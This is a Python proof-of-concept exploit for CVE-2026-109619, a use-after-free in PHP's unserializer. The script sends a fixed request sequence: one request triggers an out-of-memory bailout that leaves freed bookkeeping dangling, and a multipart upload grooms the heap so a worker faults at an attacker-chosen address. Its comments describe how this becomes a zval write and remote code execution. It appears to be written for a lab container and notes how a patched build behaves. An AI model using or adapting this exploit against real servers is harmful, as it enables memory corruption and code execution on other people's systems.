#!/usr/bin/env python3
# INDEX: unserialize stale-bookkeeping dangle groomed to attacker-controlled fault | cli | fixed 2-request groom sequence
"""controlled_fault_groom.py - CVE-2026-109619 grooming controlled fault.

Turns the unserializer's stale bookkeeping into a controlled fault (the read
half of the write primitive): request 1' OOMs after a duplicate array key
pushed a value through var_push_dtor(), request 2' grooms the freed
php_unserialize_data chunk with FILLUNIT form-field buffers, and the session
decode's tmp_var() dereferences the planted last_dtor - the worker faults at
the attacker-chosen address.

Usage:
    python3 -I poc/bugs/controlled_fault_groom.py --service cli-vuln http://127.0.0.1:80
"""
from __future__ import annotations

import argparse
import os
import struct
import sys
import tempfile

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import curl, worker_alive  # noqa: E402
from common.docker_compose import docker_cp  # noqa: E402

from common.session_ids import SID_B  # noqa: E402


# controlled_fault_groom: CVE-2026-109619 grooming (turning the stale bookkeeping into a
# controlled fault, the read half of the write primitive). R1'
# (unser.php?shape=dup) makes the unserialize() OOM fire *after* a duplicate
# array key pushed a refcounted value through var_push_dtor(), so the bailout
# leaves BG(unserialize).data pointing at the freed 8 KiB
# php_unserialize_data chunk (A; gdb-verified, its last_dtor/used_slots
# survive the free). R2' is an upload-progress multipart whose groom form
# fields each read one FILLUNIT-buffered value: the raw value buffer (a plain
# char* whose bytes are ours) is a 1-page ZendMM allocation freed right after
# registration - freed-but-intact, and ZendMM's best-fit page search hands
# the freed bookkeeping's pages to the groom. When a groom buffer covers A,
# the session decode's tmp_var() reads
#     var_hash = *(A + 16)   (last_dtor - our bytes at value[16:24] = --x)
#     used_slots = *var_hash  (read at X -> controlled fault; with X pointing
#                              at a fake var_dtor_entries,
#                              current = X+16+used_slots*16 receives the
#                              decoded session value: a zval write at a
#                              chosen signed offset - the RCE step)
# The layout is pinned by the exact request sequence: controlled_fault_groom drives curl
# with a fixed header set; in the lab --service runs curl inside the target
# container (the verified layout). A patched build runs the same sequence
# cleanly (the soft-OOM unwind resets BG(unserialize) before reuse).

def groom_files(x, size, ngroom, tmpdir):
    """Write the groom form-field bodies (and the victim file) to tmpdir."""
    val = b"G" * size
    val = val[:16] + struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF) + val[24:]
    paths = []
    for i in range(ngroom):
        p = os.path.join(tmpdir, f"groom{i}.bin")
        with open(p, "wb") as f:
            f.write(val)
        paths.append(p)
    vp = os.path.join(tmpdir, "victim.bin")
    with open(vp, "wb") as f:
        f.write(b"V" * 1024)
    return paths, vp


def drive(args):
    """CVE-2026-109619 grooming: controlled fault via the stale bookkeeping."""
    base = args.url.rstrip("/")
    svc = args.service
    run = lambda a, t=90: curl(a, timeout=t, service=svc)

    # Warm-up + session B + payload probe: nothing may run between the
    # producer and the consumer below.
    out = run([f"{base}/index.php"], 15)
    print(f"[W0] warm-up: {out[:40]!r}")
    out = run([f"{base}/sess.php?blob=0&sid={SID_B}"], 30)
    print(f"[W2] session B: {out[:40]!r}")
    out = run([f"{base}/unser.php?shape=dup&check"], 30)
    print(f"[W1] payload2: {out[:40]!r}")

    # R1': producer - the OOM fires after var_push_dtor() published a
    # var_dtor_entries chunk, leaving BG(unserialize).data dangling.
    print("[R1'] producer: unserialize() OOMs after var_push_dtor()")
    out = run([f"{base}/unser.php?shape=dup"], 60)
    print(f"[R1'] -> {out[:50]!r}")

    # R2': consumer - groom form fields spray same-page-class chunks over the
    # freed bookkeeping; the session decode's tmp_var() then reads last_dtor
    # (our bytes at groom value[16:24]) and faults at that address.
    with tempfile.TemporaryDirectory(prefix="controlled_fault_groom-") as td:
        grooms, victim = groom_files(args.x, args.size, args.grooms, td)
        cmd = [f"{base}/r2g.php",
               "-F", f"PHPSESSID={SID_B}",
               "-F", "PHP_SESSION_UPLOAD_PROGRESS=k"]
        for i, g in enumerate(grooms):
            cmd += ["-F", f"g{i}=<{g}"]
        cmd += ["-F", f"victim=@{victim};filename=victim.bin;"
                      f"type=application/octet-stream"]
        print(f"[R2'] POST {base}/r2g.php via curl (groom size {args.size} x"
              f"{args.grooms}, last_dtor={args.x:#x})")
        if svc is None:
            out = run(cmd, 90)
            print(f"[R2'] -> {out[:120]!r}")
        else:
            # The groom bodies must be readable inside the container.
            for i, g in enumerate(grooms):
                docker_cp(g, f"{svc}:/tmp/controlled_fault_groom-g{i}.bin")
                cmd = [c.replace(g, f"/tmp/controlled_fault_groom-g{i}.bin") for c in cmd]
            docker_cp(victim, f"{svc}:/tmp/controlled_fault_groom-victim.bin")
            cmd = [c.replace(victim, "/tmp/controlled_fault_groom-victim.bin") for c in cmd]
            out = run(cmd, 90)
            print(f"[R2'] -> {out[:120]!r}")
    if svc is None:
        alive = worker_alive(base)
    else:
        out = run([f"{base}/index.php"], 8)
        alive = out.startswith(b'{"ok"')
    print(f"[R2'] worker alive after: {alive}")
    if alive:
        print("[controlled_fault_groom] no fault: the groom missed the freed bookkeeping on this")
        print("[controlled_fault_groom] layout - retry with a different --grooms/--size, or run")
        print("[controlled_fault_groom] against a freshly restarted worker (heap history matters).")
    else:
        print(f"[controlled_fault_groom] VULNERABLE: worker died reading used_slots at last_dtor")
        print(f"[controlled_fault_groom] = {args.x:#x} (our bytes). Confirm the fault:")
        print(f"[controlled_fault_groom]   docker compose ps | grep cli-vuln  (Exited (139))")
        print(f"[controlled_fault_groom]   dmesg | tail   (general protection / segfault, ip in var_tmp_var)")
        print(f"[controlled_fault_groom] A patched build answers 200 and stays alive (the soft-OOM")
        print(f"[controlled_fault_groom] patch clears the bookkeeping at the next safe point).")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("url")
    ap.add_argument("--x", type=lambda v: int(v, 0), default=0x4141414141414141,
                    help="value planted as last_dtor (A+16) in the groomed "
                         "chunk; the worker faults reading used_slots at X")
    ap.add_argument("--size", type=int, default=4071,
                    help="groom form-field size in bytes (raw buffer = size+1)")
    ap.add_argument("--grooms", type=int, default=2,
                    help="number of groom fields")
    ap.add_argument("--service", default=None,
                    help="docker compose service to run curl inside (lab mode; "
                         "pins the client and request bytes to the verified "
                         "grooming layout, e.g. --service cli-vuln)")
    drive(ap.parse_args())


if __name__ == "__main__":
    main()
